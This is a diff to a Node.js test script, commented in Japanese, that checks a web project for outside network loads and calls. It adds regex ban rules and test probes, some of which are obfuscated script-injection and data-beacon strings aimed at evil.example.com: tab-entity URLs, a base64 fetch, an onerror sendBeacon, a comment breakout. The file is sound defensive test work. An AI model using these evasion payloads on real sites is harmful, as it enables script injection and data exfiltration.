@@ -11,7 +11,7 @@
 // 決まりを外すときは、その行に「// arch-allow: 理由」を書く。外した数を毎回出す。
 // 実行: node test/arch.check.mjs
 import { readFileSync, existsSync, readdirSync } from 'node:fs';
-import { allowTable, fileProblems, unusedAllows, importmapOf, importProblems } from './outside.mjs';
+import { allowTable, tableProblems, fileProblems, unusedAllows, importmapOf, importProblems } from './outside.mjs';
 
 const root = new URL('../', import.meta.url);
 const read = (p) => readFileSync(new URL(p, root), 'utf8');
@@ -85,7 +85,10 @@ const NET_TOOLS = [
   [/\bel\s*\(\s*['"`](?:script|link|iframe|frame|object|embed)['"`]/i, '読み込むタグを作っている', true],
   /* 文字列の頭の // と、ソースで \\\\ と書いた物（文字としては \\。ブラウザは // と同じに読む）。正規表現の '\\b' は外さない */
   [/['"`]\s*(?:[a-z][a-z0-9+.-]*:)?(?:\/\/|\\{4})[^\s'"`]/i, '外の URL を文字で書いている', true],
-  [/\b(?:https?|wss?|ftp):[\\/]{2}/i, '外の URL を文字で書いている', true]
+  [/\b(?:https?|wss?|ftp):[\\/]{2}/i, '外の URL を文字で書いている', true],
+  /* 文字を組み立てて名前を作る形（window['fe' + 'tch']）は、上の禁止を素通りするので、引く道具ごと禁止する */
+  [/\b(?:window|globalThis|self)\s*\??\.?\s*\[/, '文字の名前で外のものを引いている'],
+  [/\beval\b|\bFunction\s*\(/, 'eval / Function']
 ];
 const NET_BAN = { line: [[/\bfetch\b/, '外への通信 fetch (ai-reader.js 以外)'], ...NET_TOOLS], file: [] };
 const AI_READER_BAN = { line: NET_TOOLS, file: [] };
@@ -170,6 +173,7 @@ if (!/function readSample\(/.test(read('js/ai-reader.js'))) fail('js/ai-reader.j
 /* 8. 外から読む先。許可は spec の表「外から読む先」だけから、ファイルごとに読む */
 const ALLOW = allowTable(doc);
 if (!ALLOW || !Object.keys(ALLOW).length) fail('spec/architecture.md に表「外から読む先」が無い（検査が何も見ていない）');
+tableProblems(ALLOW).forEach(fail);
 const htmlFiles = readdirSync(new URL('./', root)).filter(f => f.endsWith('.html') && !f.endsWith('.local.html'));
 const cssFiles = readdirSync(new URL('css/', root)).filter(f => f.endsWith('.css')).map(f => `css/${f}`);
 if (!htmlFiles.length) fail('検査する HTML が無い');
@@ -239,22 +243,37 @@ const FILE_PROBES = [
   [IDX, '<script src="ht&#x9;tps://evil.example.com/x.js"></script>', true],
   [IDX, '<script src="\\\\evil.example.com/x.js"></script>', true],
   [IDX, `<script src="${TJS}../evil@1/x.js" integrity="sha512-x"></script>`, true],
+  [IDX, `<!-- <a title="x --><script src="${QR}x.js"></script>`, true],
+  [IDX, `<svg><script href="${QR}x.js"></script></svg>`, true],
+  [IDX, "<script type=\"module\">import { OrbitControls } from 'three/addons/controls/OrbitControls.js';</script>", true],
+  [IDX, "<script>fetch(atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29t'))</script>", true],
+  [IDX, '<img src="assets/x.png" onerror="navigator.sendBeacon(u, d)">', true],
+  [IDX, '<a href="javascript:void(0)">x</a>', true],
+  [IDX, '<script src="data:text/javascript;base64,ZmV0Y2goKQ==" integrity="sha256-AAAA"></script>', true],
+  [IDX, '<img src="https:/&#9;/evil.example.com/p.png">', true],
+  [IDX, '<img src="https:/\t/evil.example.com/p.png">', true],
+  [IDX, "<style>.a{background:url('https:\\2f\\2f evil.example.com/p.png')}</style>", true],
   [NONE, '@import url("https://fonts.googleapis.com/css2?family=X");', false],
   [NONE, '.a{background:url(//evil.example.com/p.png)}', false]
 ];
 const FILE_CLEAN = [
-  [IDX, `<script src="${QR}x.js" integrity="sha512-x" crossorigin="anonymous"></script><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=X">`, true],
+  [IDX, `<script src="${QR}x.js" integrity="sha512-x" crossorigin="anonymous"></script><link rel="stylesheet" href="css/fonts.css">`, true],
+  [NONE, '<img src="https:/evil.example.com/p.png">', true],   /* https のページでは自分のサイトのパスになる（外ではない） */
   [NONE, '<a href="index.html">x</a><script src="js/app.js"></script><svg xmlns="http://www.w3.org/2000/svg"></svg>', true],
   [NONE, '.a{background:url(assets/x.png)}', false]
 ];
 const NET_PROBES = ['import("https://evil.example.com/x.js");', "const x = '\\\\\\\\evil.example.com/a';", "el('script', { src: u });", "new Image().src = 'https://evil.example.com/p?d=' + d;",
   'navigator.sendBeacon(u, d);', 'const f = fetch; f(u);', 'fetch\n(u);', "document.createElement('iframe');", 'const w = new Worker(u);',
-  'const s = new WebSocket(u);', "const x = '//evil.example.com/a';", 'const x = "wss://evil.example.com/a";', 'importScripts(u);'];
+  'const s = new WebSocket(u);', "const x = '//evil.example.com/a';", 'const x = "wss://evil.example.com/a";', 'importScripts(u);',
+  "window['fe' + 'tch'](u);", "Function('return 1')();"];
 const NET_CLEAN = ["const s = 'a//b'; const u = '/api/read'; const p = x.split('//');", "const re = new RegExp('\\\\b(?:cold)\\\\b'); const e = s.replace(r, '\\\\$&');", "el('button', { type: 'button' });", 'const prefetch = 1;'];
 const IMPORT_PROBES = ["import { OrbitControls } from 'three/addons/controls/OrbitControls.js';", "import x from 'lodash';",
   "export * from 'https://evil.example.com/x.js';"];
 const IMPORT_CLEAN = "import * as THREE from 'three';\nimport { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';\nimport { a } from './a.js';";
-const probeCount = FILE_PROBES.length + NET_PROBES.length + IMPORT_PROBES.length;
+const TABLE_PROBES = [{ 'a.html': { allow: ['https://cdn.jsdelivr.net'], bare: [] } }, { 'a.html': { allow: ['https://a.example.com/x/'], bare: ['https://b.example.com/'] } },
+  { 'a.html': { allow: ['http://a.example.com/'], bare: [] } }];
+const probeCount = FILE_PROBES.length + NET_PROBES.length + IMPORT_PROBES.length + TABLE_PROBES.length;
+TABLE_PROBES.forEach(t => { if (!tableProblems(t).length) fail(`検査が甘い: 表の書き方 ${JSON.stringify(t)} を見逃した`); });
 FILE_PROBES.forEach(([rule, text, isHtml]) => { if (!fileProblems(text, rule, isHtml).length) fail(`検査が甘い: 「${text.slice(0, 70)}」を見逃した`); });
 FILE_CLEAN.forEach(([rule, text, isHtml]) => { const v = fileProblems(text, rule, isHtml); if (v.length) fail(`検査が厳しすぎる: 「${text.slice(0, 50)}」→ ${v[0]}`); });
 NET_PROBES.forEach(code => { if (!violations(code, NET_BAN).length) fail(`検査が甘い: 「${code.replace(/\n/g, ' ')}」を見逃した`); });
